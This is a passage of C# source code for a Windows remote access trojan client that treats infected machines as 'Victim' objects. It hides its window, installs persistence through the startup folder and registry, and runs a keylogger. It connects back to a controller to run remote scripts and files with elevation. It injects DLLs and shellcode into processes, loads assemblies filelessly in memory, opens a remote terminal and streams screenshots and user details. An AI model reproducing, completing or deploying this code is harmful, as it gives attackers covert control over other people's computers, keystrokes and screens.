                {
                    if (funcRunScript == null)
                        funcRunScript = new FuncRunScript();

                    if (cmd[1] == "bat")
                    {
                        string szPayload = Crypto.b64D2Str(cmd[2]);
                        string szParam = Crypto.b64D2Str(cmd[3]);

                        var x = funcRunScript.ExecBatch(szPayload, szParam.Split(' '));
                        v.SendCommand($"exec|{cmd[1]}|{x.Item1}|{Crypto.b64E2Str(x.Item2)}");
                    }
                    else if (cmd[1] == "cs")
                    {
                        string szPayload = Crypto.b64D2Str(cmd[2]);
                        string szParam = Crypto.b64D2Str(cmd[3]);

                        var x = funcRunScript.EvaluateCS(szPayload, szParam.Split(' '));
                        v.SendCommand($"exec|{cmd[1]}|{x.Item1}|{Crypto.b64E2Str(x.Item2)}");
                    }
                    else if (cmd[1] == "vb")
                    {
                        string szPayload = Crypto.b64D2Str(cmd[2]);
                        string szParam = Crypto.b64D2Str(cmd[3]);

                        var x = funcRunScript.EvaluateVB(szPayload, szParam.Split(' '));
                        v.SendCommand($"exec|{cmd[1]}|{x.Item1}|{Crypto.b64E2Str(x.Item2)}");
                    }
                    else if (cmd[1] == "file")
                    {
                        bool bRunAs = cmd[2] == "1";
                        bool bOutput = cmd[3] == "1";
                        bool bCreateNoWindow = cmd[4] == "1";
                        bool bTimeout = cmd[5] == "1";
                        int nTimeout = int.Parse(cmd[6]);

                        string file = Crypto.b64D2Str(cmd[7]);
                        string param = Crypto.b64D2Str(cmd[8]);

                        StringBuilder sb = new StringBuilder();

                        using (Process p = new Process()
                        {
                            StartInfo = new ProcessStartInfo()
                            {
                                FileName = file,
                                Arguments = param,
                                CreateNoWindow = bCreateNoWindow,
                                UseShellExecute = false,
                                RedirectStandardError = true,
                                RedirectStandardOutput = true,
                            }
                        })
                        {
                            if (bRunAs)
                                p.StartInfo.Verb = "runas";

                            p.Start();
                            if (bOutput)
                            {
                                sb.AppendLine(p.StandardOutput.ReadToEnd());
                                sb.AppendLine(p.StandardError.ReadToEnd());

                                if (bTimeout && !p.WaitForExit(nTimeout))
                                {
                                    p.Kill();
                                    sb.AppendLine("Execution timeout.");
                                }

                                v.SendCommand("exec|file|output|" + Crypto.b64E2Str(sb.ToString()));
                            }
                        }

                    }
                    else if (cmd[1] == "url")
                    {
                        string szURL = Crypto.b64D2Str(cmd[3]);
                        if (cmd[2] == "open")
                        {
                            ProcessStartInfo psi = new ProcessStartInfo()
                            {
                                FileName = "cmd.exe",
                                Arguments = $"/C start \"{szURL}\"",
                            };
                            Process p = new Process();
                            p.StartInfo = psi;
                            p.Start();

                            p.WaitForExit();

                            v.SendCommand("exec|url|down|1");
                        }
                        else if (cmd[2] == "run")
                        {

                        }
                    }
                }
                
                #endregion
                #region DLL

                else if (cmd[0] == "dll")
                {
                    DllLoaderMethod dlm = (DllLoaderMethod)int.Parse(cmd[1]);
                    byte[] abBuffer = Convert.FromBase64String(cmd[2]);

                    (int nCode, string szMsg) x = (0, "Do nothing.");

                    switch (dlm)
                    {
                        case DllLoaderMethod.CreateRemoteThread:
                            int nProcId = int.Parse(cmd[3]);
                            x = clsLoader.fnRemoteThread(abBuffer, nProcId);
                            break;
                        case DllLoaderMethod.DotNetAssemblyLoad:
                            string szTypeName = cmd[3];
                            string szMethod = cmd[4];
                            x = clsLoader.fnLoadDotNetDll(abBuffer, szTypeName, szMethod);
                            break;
                        case DllLoaderMethod.ShellCode:
                            x = clsLoader.fnInjectShellCode(abBuffer);
                            break;
                    }

                    v.SendCommand($"dll|{x.nCode}|{Crypto.b64E2Str(x.szMsg)}");
                }

                #endregion

                else if (cmd[0] == "plugin")
                {
                    if (m_pluginMgr == null)
                    {
                        var context = new clsPluginContext();
                        m_pluginMgr = new clsPluginMgr(context);
                    }

                    if (cmd[1] == "ls")
                    {
                        var plugins = m_pluginMgr.Plugins;
                        List<string> ls = new List<string>();
                        foreach (string szName in plugins.Keys)
                        {
                            var plugin = plugins[szName];
                            ls.Add($"{plugin.Name},{plugin.Version}");
                        }

                        v.fnSendCommand(new string[]
                        {
                            "plugin",
                            "ls",
                            string.Join(",", ls.Select(x => Crypto.b64E2Str(x))),
                        });
                    }
                    else if (cmd[1] == "load")
                    {
                        try
                        {
                            string szName = cmd[2];
                            byte[] abPluginBuffer = Convert.FromBase64String(cmd[3]);

                            m_pluginMgr.Load(abPluginBuffer);

                            v.fnSendCommand(new string[]
                            {
                                "plugin",
                                "load",
                                szName,
                            });
                        }
                        catch (ReflectionTypeLoadException ex)
                        {
                            MessageBox.Show(ex.Message);
                        }
                    }
                    else if (cmd[1] == "run")
                    {
                        try
                        {
                            string szName = cmd[2];
                            var dic = new Dictionary<string, object>();

                            for (int i = 3; i < cmd.Length; i++)
                            {
                                string szItem = Crypto.b64D2Str(cmd[i]);
                                string[] s = szItem.Split('=');

                                dic.Add(s[0], s[1]);
                            }

                            var ret = m_pluginMgr.Execute(szName, dic);

                        }
                        catch (Exception ex)
                        {

                        }
                    }
                }

                #region Fileless Execution

                else if (cmd[0] == "fle") //Fileless Execution
                {
                    string[] alpArgs = cmd[1].Split(',').Select(x => Crypto.b64D2Str(x)).ToArray();
                    byte[] abAssembly = Convert.FromBase64String(cmd[2]);
                    abAssembly = clsEZData.abGzipDecompress(abAssembly);

                    installer.fnLoadToMemory(alpArgs, abAssembly);
                }

                #endregion

                else if (cmd[0] == "xterm")
                {
                    if (cmd[1] == "start")
                    {
                        if (m_fnXterm == null)
                        {
                            m_fnXterm = new clsfnXterm(v);
                            m_fnXterm.fnStart();
                        }
                    }
                    else if (cmd[1] == "stop")
                    {
                        if (m_fnXterm != null)
                        {
                            m_fnXterm.fnStop();
                            m_fnXterm.Dispose();
                            m_fnXterm = null;
                        }
                    }
                    else if (cmd[1] == "input")
                    {
                        if (m_fnXterm != null)
                        {
                            byte[] abData = Convert.FromBase64String(cmd[2]);
                            m_fnXterm.fnPushInput(abData);
                        }
                    }
                    else if (cmd[1] == "resize")
                    {
                        if (m_fnXterm != null)
                        {
                            int nCols = int.Parse(cmd[2]);
                            int nRows = int.Parse(cmd[3]);

                            m_fnXterm.fnResize(nCols, nRows);
                        }
                    }
                    else if (cmd[1] == "exec")
                    {

                    }
                }
            }
            catch (Exception ex)
            {
                //MessageBox.Show(ex.Message, "winClient48");
                v.SendCommand($"error|{Crypto.b64E2Str(ex.Message)}");
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="query"></param>
        /// <returns></returns>
        static string WMI_Query(string query)
        {
            List<string> result = new List<string>();
            using (var search = new ManagementObjectSearcher(query))
            {
                using (ManagementObjectCollection coll = search.Get())
                {
                    try
                    {
                        foreach (var device in coll)
                        {
                            List<string> tmp = new List<string>();
                            foreach (PropertyData data in device.Properties)
                            {
                                tmp.Add(Crypto.b64E2Str($"{data.Name};{device[data.Name]}"));
                            }
                            result.Add(Crypto.b64E2Str(string.Join(",", tmp.ToArray())));
                        }
                    }
                    catch (Exception ex)
                    {
                        ;
                        Console.WriteLine(ex.Message);
                    }
                }
            }
            return string.Join(",", result.ToArray());
        }
        private DataTable fnWmiQuery(string szQuery)
        {
            DataTable dt = new DataTable();
            try
            {
                using (var search = new ManagementObjectSearcher(szQuery))
                {
                    using (var coll = search.Get())
                    {
                        bool bCollAdded = false;
                        foreach (ManagementObject obj in coll)
                        {
                            if (!bCollAdded)
                            {
                                foreach (PropertyData prop in obj.Properties)
                                    dt.Columns.Add(prop.Name.ToString());

                                bCollAdded = true;
                            }

                            DataRow dr = dt.NewRow();
                            foreach (PropertyData prop in obj.Properties)
                                dr[prop.Name] = prop.Value ?? DBNull.Value;

                            dt.Rows.Add(dr);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                dt.Columns.Add("Err");
                DataRow dr = dt.NewRow();
                dr["Err"] = ex.Message;
                dt.Rows.Add(dr);
            }

            return dt;
        }
        /// <summary>
        /// 
        /// </summary>
        /// <returns></returns>

        //--------------[ REMOTE DESKTOP | START ]--------------\\
        /// <summary>
        /// Convert bitmap bytes to base-64 string.
        /// </summary>
        /// <param name="bitmap"></param>
        /// <returns></returns>
        /// <summary>
        /// Return index by monitor device name.
        /// </summary>
        /// <param name="device_name"></param>
        /// <returns></returns>
        int FindDesktopIndex(string device_name)
        {
            int idx = 0;
            for (int i = 0; i < Screen.AllScreens.Length; i++)
            {
                if (Screen.AllScreens[i].DeviceName.Equals(device_name, StringComparison.OrdinalIgnoreCase))
                {
                    idx = i;
                    break;
                }
            }

            return idx;
        }
        /// <summary>
        /// Capture screen image and convert bitmap into base64 then return.
        /// </summary>
        /// <param name="v"></param>
        /// <param name="device_name"></param>
        /// <param name="width"></param>
        /// <param name="height"></param>
        /// <returns></returns>
        Bitmap fnScreenShot(Victim v, string device_name, int width, int height)
        {
            int idx = FindDesktopIndex(device_name);
            Bitmap bitmap = new Bitmap(width, height, System.Drawing.Imaging.PixelFormat.Format32bppRgb);
            Rectangle capture_rect = Screen.AllScreens[idx].Bounds;
            Graphics capture_graphics = Graphics.FromImage(bitmap);
            capture_graphics.CopyFromScreen(capture_rect.Left, capture_rect.Top, 0, 0, capture_rect.Size);
            
            return bitmap;
        }
        /// <summary>
        /// Start remote desktop live.
        /// </summary>
        /// <param name="v"></param>
        /// <param name="device_name"></param>
        /// <param name="width"></param>
        /// <param name="height"></param>
        void DesktopStart(Victim v, string device_name, int width, int height)
        {
            while (is_connected && send_screenshot)
            {
                Bitmap bmp = fnScreenShot(v, device_name, width, height);
                string b64_img = Global.BitmapToBase64(bmp);
                v.encSend(2, 0, "desktop|start|" + b64_img + "|" + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss"));
                Thread.Sleep(m_nDesktopDelay);
            }
            send_stopped = true;
        }
        /// <summary>
        /// Initialization of reomte desktop.
        /// </summary>
        /// <param name="v"></param>
        static void DesktopInit(Victim v)
        {
            List<string> result = new List<string>();
            foreach (var screen in Screen.AllScreens)
            {
                var bounds = screen.Bounds;
                string name = screen.DeviceName;
                int left = bounds.Left;
                int top = bounds.Top;
                int width = bounds.Width;
                int height = bounds.Height;
                result.Add($"{name},{left},{top},{width},{height}");
            }
            string data = string.Join("+", result.ToArray());
            v.SendCommand("desktop|init|" + data);
        }
        //--------------[ REMOTE DESKTOP | END ]--------------\\

        //--------------[ CLIENT INFO | START ]--------------\\
        
        /// <summary>
        /// Check current user is admin.
        /// </summary>
        /// <returns></returns>
        public static bool isAdmin()
        {
            WindowsIdentity identity = WindowsIdentity.GetCurrent();
            WindowsPrincipal principal = new WindowsPrincipal(identity);

            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        /// <summary>
        /// Send victim data.
        /// </summary>
        /// <param name="v"></param>
        void SendInfo(Victim v)
        {
            Rectangle bounds = Screen.PrimaryScreen.Bounds;

            while (is_connected)
            {
                try
                {
                    string[] info_array = new string[]
                    {
                        "info",
                        clntConfig.szOnlineID,
                        Environment.UserName,
                        isAdmin() ? "Yes" : "No",
                        Global.getOS(),
                        "", //PING
                        Global.getCPU(), //CPU
                        Screen.AllScreens.Length.ToString(), //MONITOR
                        new Webcam().GetDevices().Count.ToString(), //WEBCAM
                        Crypto.b64E2Str(Global.GetActiveWindowTitle()),
                        send_screen ? Global.BitmapToBase64(fnScreenShot(v, Screen.PrimaryScreen.DeviceName, bounds.Width, bounds.Height)) : string.Empty,
                    };

                    string info = string.Join("|", info_array);
                    v.SendCommand(info);
                }
                catch (Exception ex)
                {
                    is_connected = false;
                }

                Thread.Sleep(clntConfig.dwSendInfo);
            }
        }
        //--------------[ CLIENT INFO | END ]--------------\\

        void ReleaseFunction()
        {
            if (funcMicAudio != null)
                funcMicAudio = null;
        }
        void Disconnect()
        {
            if (is_connected)
            {
                socket.Close();
                is_connected = false;
                Environment.Exit(0);
            }
        }
        void Reconnect()
        {
            if (is_connected)
            {
                socket.Close();
                is_connected = false;
            }
        }
        void Connect()
        {
            try
            {
                if (!IPAddress.TryParse(ip, out var address))
                {
                    try
                    {
                        IPAddress[] aAddr = Dns.GetHostAddresses(ip);
                        if (aAddr.Length > 0)
                            ip = aAddr[0].ToString();
                    }
                    catch
                    {

                    }
                }

                Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                socket.Connect(ip, port);
                Victim v = new Victim(socket);
                //socket.BeginReceive(v.buffer, 0, v.buffer.Length, SocketFlags.None, new AsyncCallback(Received), v);
                new Thread(() => Received(v)).Start();
                is_connected = true;
            }
            catch (Exception ex)
            {
                //MessageBox.Show(ex.Message);
            }
        }
        void Main()
        {
            try
            {
                installer = new Installer();
                installer.m_szCurrentPath = Process.GetCurrentProcess().MainModule.FileName;
                installer.m_bCopyDir = m_bCopyDir;
                installer.m_szCopyPath = Environment.ExpandEnvironmentVariables(Path.Combine(m_szCopyDir, Path.GetFileName(installer.m_szCurrentPath)));
                installer.m_bStartUp = m_bCopyStartUp;
                installer.m_szStartUpName = Environment.ExpandEnvironmentVariables(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), m_szCopyStartUp));
                installer.m_bReg = m_bReg;
                installer.m_szRegKeyName = m_szRegKeyName;

                installer.Start();

                /*
                string[] id_array = Global.WMI_QueryNoEncode("select serialnumber from win32_diskdrive");
                string szSerialNumber = id_array[0].Replace(" ", string.Empty).Trim();
                */
                DataTable dt = fnWmiQuery("select serialnumber from win32_diskdrive");
                string szSerialNumber = dt.Rows[0][0].ToString().Replace(" ", string.Empty).Trim();

                clntConfig = new ClientConfig()
                {
                    szOnlineID = $"{id_prefix}_{Dns.GetHostName()}_{szSerialNumber}",
                    bKillProcess = false,
                    ls_szKillProcess = new List<string>(),
                    dwRetry = time_reconnect,
                    dwTimeout = dwTimeout,
                    dwSendInfo = time_sendinfo,
                };

                keylogger = new KeyLogger(m_szKeylogFileName);
                new Thread(() => keylogger.Start()).Start();
                new Thread(() =>
                {
                    while (true)
                    {
                        try
                        {
                            if (!is_connected)
                            {
                                Connect();
                            }
                        }
                        catch (Exception ex)
                        {
                            //MessageBox.Show(ex.Message);
                        }
                        Thread.Sleep(clntConfig.dwRetry);
                    }
                }).Start();

                if (m_bMsgbox)
                {
                    MessageBox.Show(m_szMbText, m_szMbCaption, m_mbButton, m_mbIcon);
                }
            }
            catch (Exception ex)
            {
                //MessageBox.Show(ex.Message);
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Visible = false;
            ShowInTaskbar = false;
            new Thread(() => Main()).Start();
        }
    }
}